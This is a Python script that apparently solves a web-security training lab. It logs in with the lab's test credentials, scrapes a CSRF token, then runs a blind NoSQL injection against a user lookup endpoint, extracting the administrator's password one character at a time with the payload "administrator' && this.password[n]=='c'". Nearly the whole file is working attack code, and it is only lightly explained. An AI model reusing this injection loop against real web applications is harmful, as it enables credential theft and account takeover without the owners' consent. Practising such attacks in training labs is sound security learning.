import requests, bs4
from string import ascii_lowercase

comments = """
    This script performs a blind NoSQL injection attack to retrieve the password of the 'administrator' user
    from a vulnerable web application. It first logs in with valid credentials to obtain session cookies,
    then iteratively guesses each character of the administrator's password by exploiting a NoSQL injection
    vulnerability in the user lookup functionality.
"""

tags = """
    #noSQLInjection #webSecurity #python #requests #beautifulSoup #cookies #csrf #bruteforce
"""

class Py_testing:
    def main():
        print('/*== Project to test ==*/')

        log_url = 'https://0a1800870488ca5a80ac21200000008d.web-security-academy.net/login'

        # Get CSRF token and initial cookies
        response = requests.get(log_url)
        cookie_before_login = response.cookies.get_dict()

        soup = bs4.BeautifulSoup(response.text, 'html.parser')
        csrf_token = soup.find('input', {'name': 'csrf'}).get('value')

        data = {
            'csrf': csrf_token,
            'username': 'wiener',
            'password': 'peter'
        }

        # Log in to get authenticated cookies
        new_response = requests.post(log_url, data=data, cookies=cookie_before_login, allow_redirects=False)
        cookies_after_login = new_response.cookies.get_dict()

        lookup_url = 'https://0a1800870488ca5a80ac21200000008d.web-security-academy.net//user/lookup?user='

        password = []
        for num in range(32):
            for char in ascii_lowercase:
                print(f'Trying character {char} for position {num}')

                payload = f"administrator'+%26%26+this.password[{num}]=='{char}'"
                response = requests.get(lookup_url + payload, cookies=cookies_after_login)

                if 'admin@normal-user.net' in response.text:
                    password.append(char)
                    print(f'Password so far {''.join(password)}')
                    break
    
if __name__ == '__main__':
    Py_testing.main()
